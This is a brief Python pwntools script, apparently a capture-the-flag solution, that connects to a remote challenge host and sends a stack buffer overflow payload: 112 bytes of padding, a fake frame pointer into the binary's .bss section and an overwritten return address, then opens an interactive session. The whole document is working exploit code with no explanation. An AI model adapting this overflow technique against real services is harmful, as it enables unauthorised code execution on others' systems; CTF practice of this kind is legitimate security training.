from pwn import *

r = remote('binary.utctf.live', 9002)
#r = process('./pwnable')
#gdb.attach(proc.pidof(r)[0])

ctrl_buf = ELF('pwnable').bss() + 0x100
target = 0x4005fe
payload = 'A' * 112 + p64(ctrl_buf) + p64(target)

r.recv()
r.sendline(payload)
r.recv()
r.interactive()
r.close()
